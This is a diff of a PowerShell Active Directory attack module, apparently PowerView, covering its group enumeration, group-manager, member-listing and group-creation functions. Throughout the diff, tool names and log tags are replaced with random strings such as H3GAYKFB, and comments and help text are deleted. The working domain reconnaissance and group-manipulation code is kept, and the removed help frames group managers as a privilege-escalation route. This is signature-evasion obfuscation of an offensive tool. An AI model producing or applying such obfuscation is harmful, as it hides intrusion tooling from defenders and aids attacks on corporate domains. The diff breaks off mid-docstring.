                 }
                 if ($PSBoundParameters['LDAPFilter']) {
-                    Write-Verbose "[Get-DomainGroup] Using additional LDAP filter: $LDAPFilter"
+                    Write-Verbose "[H3GAYKFB] Using additional LDAP filter: $LDAPFilter"
                     $Filter += "$LDAPFilter"
                 }
 
                 $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
-                Write-Verbose "[Get-DomainGroup] filter string: $($GroupSearcher.filter)"
+                Write-Verbose "[H3GAYKFB] filter string: $($GroupSearcher.filter)"
 
                 if ($PSBoundParameters['FindOne']) { $Results = $GroupSearcher.FindOne() }
                 else { $Results = $GroupSearcher.FindAll() }
                 $Results | Where-Object {$_} | ForEach-Object {
                     if ($PSBoundParameters['Raw']) {
-                        # return raw result objects
+                        
                         $Group = $_
                     }
                     else {
@@ -10469,7 +6175,7 @@ Custom PSObject with translated group property fields.
                 if ($Results) {
                     try { $Results.dispose() }
                     catch {
-                        Write-Verbose "[Get-DomainGroup] Error disposing of the Results object"
+                        Write-Verbose "[H3GAYKFB] Error disposing of the Results object"
                     }
                 }
                 $GroupSearcher.dispose()
@@ -10479,69 +6185,8 @@ Custom PSObject with translated group property fields.
 }
 
 
-function New-DomainGroup {
-<#
-.SYNOPSIS
+function E0C95PFJ {
 
-Creates a new domain group (assuming appropriate permissions) and returns the group object.
-
-TODO: implement all properties that New-ADGroup implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-PrincipalContext  
-
-.DESCRIPTION
-
-First binds to the specified domain context using Get-PrincipalContext.
-The bound domain context is then used to create a new
-DirectoryServices.AccountManagement.GroupPrincipal with the specified
-group properties.
-
-.PARAMETER SamAccountName
-
-Specifies the Security Account Manager (SAM) account name of the group to create.
-Maximum of 256 characters. Mandatory.
-
-.PARAMETER Name
-
-Specifies the name of the group to create. If not provided, defaults to SamAccountName.
-
-.PARAMETER DisplayName
-
-Specifies the display name of the group to create. If not provided, defaults to SamAccountName.
-
-.PARAMETER Description
-
-Specifies the description of the group to create.
-
-.PARAMETER Domain
-
-Specifies the domain to use to search for user/group principals, defaults to the current domain.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-New-DomainGroup -SamAccountName TestGroup -Description 'This is a test group.'
-
-Creates the 'TestGroup' group with the specified description.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-New-DomainGroup -SamAccountName TestGroup -Description 'This is a test group.' -Credential $Cred
-
-Creates the 'TestGroup' group with the specified description using the specified alternate credentials.
-
-.OUTPUTS
-
-DirectoryServices.AccountManagement.GroupPrincipal
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -10578,12 +6223,12 @@ DirectoryServices.AccountManagement.GroupPrincipal
     }
     if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
     if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
-    $Context = Get-PrincipalContext @ContextArguments
+    $Context = X23WOD9H @ContextArguments
 
     if ($Context) {
         $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)
 
-        # set all the appropriate group parameters
+        
         $Group.SamAccountName = $Context.Identity
 
         if ($PSBoundParameters['Name']) {
@@ -10603,86 +6248,21 @@ DirectoryServices.AccountManagement.GroupPrincipal
             $Group.Description = $Description
         }
 
-        Write-Verbose "[New-DomainGroup] Attempting to create group '$SamAccountName'"
+        Write-Verbose "[E0C95PFJ] Attempting to create group '$SamAccountName'"
         try {
             $Null = $Group.Save()
-            Write-Verbose "[New-DomainGroup] Group '$SamAccountName' successfully created"
+            Write-Verbose "[E0C95PFJ] Group '$SamAccountName' successfully created"
             $Group
         }
         catch {
-            Write-Warning "[New-DomainGroup] Error creating group '$SamAccountName' : $_"
+            Write-Warning "[E0C95PFJ] Error creating group '$SamAccountName' : $_"
         }
     }
 }
 
 
-function Get-DomainManagedSecurityGroup {
-<#
-.SYNOPSIS
+function EK1641ZV {
 
-Returns all security groups in the current (or target) domain that have a manager set.
-
-Author: Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>, Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainObject, Get-DomainGroup, Get-DomainObjectAcl  
-
-.DESCRIPTION
-
-Authority to manipulate the group membership of AD security groups and distribution groups
-can be delegated to non-administrators by setting the 'managedBy' attribute. This is typically
-used to delegate management authority to distribution groups, but Windows supports security groups
-being managed in the same way.
-
-This function searches for AD groups which have a group manager set, and determines whether that
-user can manipulate group membership. This could be a useful method of horizontal privilege
-escalation, especially if the manager can manipulate the membership of a privileged group.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainManagedSecurityGroup | Export-PowerViewCSV -NoTypeInformation group-managers.csv
-
-Store a list of all security groups with managers in group-managers.csv
-
-.OUTPUTS
-
-PowerView.ManagedSecurityGroup
-
-A custom PSObject describing the managed security group.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ManagedSecurityGroup')]
@@ -10748,23 +6328,23 @@ A custom PSObject describing the managed security group.
             $TargetDomain = $Env:USERDNSDOMAIN
         }
 
-        # go through the list of security groups on the domain and identify those who have a manager
-        Get-DomainGroup @SearcherArguments | ForEach-Object {
+        
+        H3GAYKFB @SearcherArguments | ForEach-Object {
             $SearcherArguments['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
             $SearcherArguments['Identity'] = $_.managedBy
             $Null = $SearcherArguments.Remove('LDAPFilter')
 
-            # $SearcherArguments
-            # retrieve the object that the managedBy DN refers to
-            $GroupManager = Get-DomainObject @SearcherArguments
-            # Write-Host "GroupManager: $GroupManager"
+            
+            
+            $GroupManager = U3GGBSG9 @SearcherArguments
+            
             $ManagedGroup = New-Object PSObject
             $ManagedGroup | Add-Member Noteproperty 'GroupName' $_.samaccountname
             $ManagedGroup | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
             $ManagedGroup | Add-Member Noteproperty 'ManagerName' $GroupManager.samaccountname
             $ManagedGroup | Add-Member Noteproperty 'ManagerDistinguishedName' $GroupManager.distinguishedName
 
-            # determine whether the manager is a user or a group
+            
             if ($GroupManager.samaccounttype -eq 0x10000000) {
                 $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'Group'
             }
@@ -10783,17 +6363,17 @@ A custom PSObject describing the managed security group.
             if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
             if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }
 
-            # # TODO: correct!
-            # # find the ACLs that relate to the ability to write to the group
-            # $xacl = Get-DomainObjectAcl @ACLArguments -Verbose
-            # # $ACLArguments
-            # # double-check that the manager
-            # if ($xacl.ObjectType -eq 'bf9679c0-0de6-11d0-a285-00aa003049e2' -and $xacl.AceType -eq 'AccessAllowed' -and ($xacl.ObjectSid -eq $GroupManager.objectsid)) {
-            #     $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' $True
-            # }
-            # else {
-            #     $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' $False
-            # }
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
 
             $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'
 
@@ -10804,214 +6384,8 @@ A custom PSObject describing the managed security group.
 }
 
 
-function Get-DomainGroupMember {
-<#
-.SYNOPSIS
+function H3GAYKFBMember {
 
-Return the members of a specific domain group.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Get-DomainGroup, Get-DomainGroupMember, Convert-ADName, Get-DomainObject, ConvertFrom-SID  
-
-.DESCRIPTION
-
-Builds a directory searcher object using Get-DomainSearcher, builds a custom
-LDAP filter based on targeting/filter parameters, and searches for the specified
-group matching the criteria. Each result is then rebound and the full user
-or group object is returned.
-
-.PARAMETER Identity
-
-A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
-specifying the group to query for. Wildcards accepted.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER Recurse
-
-Switch. If the group member is a group, recursively try to query its members as well.
-
-.PARAMETER RecurseUsingMatchingRule
-
-Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query to recurse.
-Much faster than manual recursion, but doesn't reveal cross-domain groups,
-and only returns user accounts (no nested group objects themselves).
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainGroupMember "Desktop Admins"
-
-GroupDomain             : testlab.local
-GroupName               : Desktop Admins
-GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
-MemberDomain            : testlab.local
-MemberName              : Testing Group
-MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
-MemberObjectClass       : group
-MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129
-
-GroupDomain             : testlab.local
-GroupName               : Desktop Admins
-GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
-MemberDomain            : testlab.local
-MemberName              : arobbins.a
-MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
-MemberObjectClass       : user
-MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112
-
-.EXAMPLE
-
-'Desktop Admins' | Get-DomainGroupMember -Recurse
-
-GroupDomain             : testlab.local
-GroupName               : Desktop Admins
-GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
-MemberDomain            : testlab.local
-MemberName              : Testing Group
-MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
-MemberObjectClass       : group
-MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129
-
-GroupDomain             : testlab.local
-GroupName               : Testing Group
-GroupDistinguishedName  : CN=Testing Group,CN=Users,DC=testlab,DC=local
-MemberDomain            : testlab.local
-MemberName              : harmj0y
-MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
-MemberObjectClass       : user
-MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108
-
-GroupDomain             : testlab.local
-GroupName               : Desktop Admins
-GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
-MemberDomain            : testlab.local
-MemberName              : arobbins.a
-MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
-MemberObjectClass       : user
-MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112
-
-.EXAMPLE
-
-Get-DomainGroupMember -Domain testlab.local -Identity 'Desktop Admins' -RecurseUingMatchingRule
-
-GroupDomain             : testlab.local
-GroupName               : Desktop Admins
-GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
-MemberDomain            : testlab.local
-MemberName              : harmj0y
-MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
-MemberObjectClass       : user
-MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108
-
-GroupDomain             : testlab.local
-GroupName               : Desktop Admins
-GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
-MemberDomain            : testlab.local
-MemberName              : arobbins.a
-MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
-MemberObjectClass       : user
-MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112
-
-.EXAMPLE
-
-Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember
-
-.EXAMPLE
-
-'CN=Enterprise Admins,CN=Users,DC=testlab,DC=local', 'Domain Admins' | Get-DomainGroupMember
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainGroupMember -Credential $Cred -Identity 'Domain Admins'
-
-.EXAMPLE
-
-Get-Domain | Select-Object -Expand name
-testlab.local
-
-'dev\domain admins' | Get-DomainGroupMember -Verbose
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: [Get-DomainGroupMember] Extracted domain 'dev.testlab.local' from 'dev\domain admins'
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
-VERBOSE: [Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group)(|(samAccountName=domain admins)))
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
-VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=user1,CN=Users,DC=dev,DC=testlab,DC=local)))
-
-GroupDomain             : dev.testlab.local
-GroupName               : Domain Admins
-GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
-MemberDomain            : dev.testlab.local
-MemberName              : user1
-MemberDistinguishedName : CN=user1,CN=Users,DC=dev,DC=testlab,DC=local
-MemberObjectClass       : user
-MemberSID               : S-1-5-21-339048670-1233568108-4141518690-201108
-
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
-VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local)))
-GroupDomain             : dev.testlab.local
-GroupName               : Domain Admins
-GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
-MemberDomain            : dev.testlab.local
-MemberName              : Administrator
-MemberDistinguishedName : CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local
-MemberObjectClass       : user
-MemberSID               : S-1-5-21-339048670-1233568108-4141518690-500
-
-.OUTPUTS
-
-PowerView.GroupMember
-
-Custom PSObject with translated group member property fields.
-
-.LINK
-
-http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
@@ -11095,15 +6469,15 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
     }
 
     PROCESS {
-        $GroupSearcher = Get-DomainSearcher @SearcherArguments
+        $GroupSearcher = NJUXTHTL @SearcherArguments
         if ($GroupSearcher) {
             if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                 $SearcherArguments['Identity'] = $Identity
                 $SearcherArguments['Raw'] = $True
-                $Group = Get-DomainGroup @SearcherArguments
+                $Group = H3GAYKFB @SearcherArguments
 
                 if (-not $Group) {
-                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity: $Identity"
+                    Write-Warning "[H3GAYKFBMember] Error searching for group with identity: $Identity"
                 }
                 else {
                     $GroupFoundName = $Group.properties.item('samaccountname')[0]
@@ -11113,12 +6487,12 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
                         $GroupFoundDomain = $Domain
                     }
                     else {
-                        # if a domain isn't passed, try to extract it from the found group distinguished name
+                        
                         if ($GroupFoundDN) {
                             $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                         }
                     }
-                    Write-Verbose "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
+                    Write-Verbose "[H3GAYKFBMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
                     $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                     $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName'))
                     $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
@@ -11136,14 +6510,14 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
                     elseif ($IdentityInstance -match '^CN=') {
                         $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                         if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
-                            #   and rebuild the domain searcher
+                            
+                            
                             $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                            Write-Verbose "[H3GAYKFBMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                             $SearcherArguments['Domain'] = $IdentityDomain
-                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
+                            $GroupSearcher = NJUXTHTL @SearcherArguments
                             if (-not $GroupSearcher) {
-                                Write-Warning "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$IdentityDomain'"
+                                Write-Warning "[H3GAYKFBMember] Unable to retrieve domain searcher for '$IdentityDomain'"
                             }
                         }
                     }
@@ -11158,8 +6532,8 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
                             $GroupName = $IdentityInstance.Split('\')[1]
                             $IdentityFilter += "(samAccountName=$GroupName)"
                             $SearcherArguments['Domain'] = $GroupDomain
-                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$GroupDomain' from '$IdentityInstance'"
-                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
+                            Write-Verbose "[H3GAYKFBMember] Extracted domain '$GroupDomain' from '$IdentityInstance'"
+                            $GroupSearcher = NJUXTHTL @SearcherArguments
                         }
                     }
                     else {
@@ -11172,17 +6546,17 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
                 }
 
                 if ($PSBoundParameters['LDAPFilter']) {
-                    Write-Verbose "[Get-DomainGroupMember] Using additional LDAP filter: $LDAPFilter"
+                    Write-Verbose "[H3GAYKFBMember] Using additional LDAP filter: $LDAPFilter"
                     $Filter += "$LDAPFilter"
                 }
 
                 $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
-                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter)"
+                Write-Verbose "[H3GAYKFBMember] H3GAYKFBMember filter string: $($GroupSearcher.filter)"
                 try {
                     $Result = $GroupSearcher.FindOne()
                 }
                 catch {
-                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity '$Identity': $_"
+                    Write-Warning "[H3GAYKFBMember] Error searching for group with identity '$Identity': $_"
                     $Members = @()
                 }
 
@@ -11193,7 +6567,7 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
                     $Members = $Result.properties.item('member')
 
                     if ($Members.count -eq 0) {
-                        # ranged searching, thanks @meatballs__ !
+                        
                         $Finished = $False
                         $Bottom = 0
                         $Top = 0
@@ -11233,7 +6607,7 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
                         $GroupFoundDomain = $Domain
                     }
                     else {
-                        # if a domain isn't passed, try to extract it from the found group distinguished name
+                        
                         if ($GroupFoundDN) {
                             $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                         }
@@ -11250,7 +6624,7 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
                     $ObjectSearcherArguments['Identity'] = $Member
                     $ObjectSearcherArguments['Raw'] = $True
                     $ObjectSearcherArguments['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
-                    $Object = Get-DomainObject @ObjectSearcherArguments
+                    $Object = U3GGBSG9 @ObjectSearcherArguments
                     $Properties = $Object.Properties
                 }
 
@@ -11280,17 +6654,17 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
                                     $MemberDomain = $MemberSimpleName.Split('@')[1]
                                 }
                                 else {
-                                    Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
+                                    Write-Warning "[H3GAYKFBMember] Error converting $MemberDN"
                                     $MemberDomain = $Null
                                 }
                             }
                             catch {
-                                Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
+                                Write-Warning "[H3GAYKFBMember] Error converting $MemberDN"
                                 $MemberDomain = $Null
                             }
                         }
                         else {
-                            # extract the FQDN from the Distinguished Name
+                            
                             $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                         }
                     }
@@ -11300,16 +6674,16 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
                     }
 
                     if ($Properties.samaccountname) {
-                        # forest users have the samAccountName set
+                        
                         $MemberName = $Properties.samaccountname[0]
                     }
                     else {
-                        # external trust users have a SID, so convert it
+                        
                         try {
                             $MemberName = ConvertFrom-SID -ObjectSID $Properties.cn[0] @ADNameArguments
                         }
                         catch {
-                            # if there's a problem contacting the domain to resolve the SID
+                            
                             $MemberName = $Properties.cn[0]
                         }
                     }
@@ -11334,12 +6708,12 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
                     $GroupMember.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                     $GroupMember
 
-                    # if we're doing manual recursion
+                    
                     if ($PSBoundParameters['Recurse'] -and $MemberDN -and ($MemberObjectClass -match 'group')) {
-                        Write-Verbose "[Get-DomainGroupMember] Manually recursing on group: $MemberDN"
+                        Write-Verbose "[H3GAYKFBMember] Manually recursing on group: $MemberDN"
                         $SearcherArguments['Identity'] = $MemberDN
                         $Null = $SearcherArguments.Remove('Properties')
-                        Get-DomainGroupMember @SearcherArguments
+                        H3GAYKFBMember @SearcherArguments
                     }
                 }
             }
@@ -11349,112 +6723,8 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
 }
 
 
-function Get-DomainGroupMemberDeleted {
-<#
-.SYNOPSIS
+function H3GAYKFBMemberDeleted {
 
-Returns information on group members that were removed from the specified
-group identity. Accomplished by searching the linked attribute replication
-metadata for the group using Get-DomainObjectLinkedAttributeHistory.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainObjectLinkedAttributeHistory
-
-.DESCRIPTION
-
-Wraps Get-DomainObjectLinkedAttributeHistory to return the linked attribute
-replication metadata for the specified group. These are cases where the
-'Version' attribute of group member in the replication metadata is even.
-
-.PARAMETER Identity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
-Wildcards accepted.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainGroupMemberDeleted | Group-Object GroupDN
-
-Count Name                      Group
------ ----                      -----
-    2 CN=Domain Admins,CN=Us... {@{GroupDN=CN=Domain Admins,CN=Users,DC=test...
-    3 CN=DomainLocalGroup,CN... {@{GroupDN=CN=DomainLocalGroup,CN=Users,DC=t...
-
-.EXAMPLE
-
-Get-DomainGroupMemberDeleted "Domain Admins" -Domain testlab.local
-
-
-GroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local
-MemberDN              : CN=testuser,CN=Users,DC=testlab,DC=local
-TimeFirstAdded        : 2017-06-13T23:07:43Z
-TimeDeleted           : 2017-06-13T23:26:17Z
-LastOriginatingChange : 2017-06-13T23:26:17Z
-TimesAdded            : 2
-LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
-                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
-                        l
-
-GroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local
-MemberDN              : CN=dfm,CN=Users,DC=testlab,DC=local
-TimeFirstAdded        : 2017-06-13T22:20:02Z
-TimeDeleted           : 2017-06-13T23:26:17Z
-LastOriginatingChange : 2017-06-13T23:26:17Z
-TimesAdded            : 5
-LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
-                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
-                        l
-
-.OUTPUTS
-
-PowerView.DomainGroupMemberDeleted
-
-Custom PSObject with translated replication metadata fields.
-
-.LINK
-
-https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [OutputType('PowerView.DomainGroupMemberDeleted')]
@@ -11527,7 +6797,7 @@ https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admi
     PROCESS {
         if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
 
-        Get-DomainObject @SearcherArguments | ForEach-Object {
+        U3GGBSG9 @SearcherArguments | ForEach-Object {
             $ObjectDN = $_.Properties['distinguishedname'][0]
             ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
                 $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
@@ -11546,7 +6816,7 @@ https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admi
                     }
                 }
                 else {
-                    Write-Verbose "[Get-DomainGroupMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
+                    Write-Verbose "[H3GAYKFBMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                 }
             }
         }
@@ -11554,75 +6824,8 @@ https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admi
 }
 
 
-function Add-DomainGroupMember {
-<#
-.SYNOPSIS
+function OMR7GHE6 {
 
-Adds a domain user (or group) to an existing domain group, assuming
-appropriate permissions to do so.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-PrincipalContext  
-
-.DESCRIPTION
-
-First binds to the specified domain context using Get-PrincipalContext.
-The bound domain context is then used to search for the specified -GroupIdentity,
-which returns a DirectoryServices.AccountManagement.GroupPrincipal object. For
-each entry in -Members, each member identity is similarly searched for and added
-to the group.
-
-.PARAMETER Identity
-
-A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
